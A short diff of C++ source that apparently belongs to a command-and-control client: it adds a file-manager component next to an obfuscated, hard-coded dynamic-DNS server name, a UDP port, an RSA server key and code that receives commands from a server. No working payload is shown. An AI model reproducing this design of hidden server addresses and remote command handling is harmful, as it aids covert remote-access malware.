@@ -5,9 +5,10 @@
 #include "External/base64.h"
 #include "External/obfuscate.h"
 #include "NetworkManager.h"
+#include "FileManager.h"
 
 constexpr unsigned int UDP_PORT = 0x154E;
-const std::string  DNS_NAME = std::string(HIDE("logicgate-test.ddns.net"));
+const std::string      DNS_NAME = std::string(HIDE("logicgate-test.ddns.net"));
 
 // info for receiving a command from the server
 // inspect the 'Packet' and construct a 'CommandDescription'
@@ -71,6 +72,7 @@ private:
     RSA*               m_ServerPublicKey  = {};
     SOCKET             m_UDPSocket        = INVALID_SOCKET;
     NetworkManager     m_NetworkManager   = {};
+    FileManager        m_FileManager;
 
 #elif defined(SERVER_RELEASE)                       // Server only client implementation
 public:
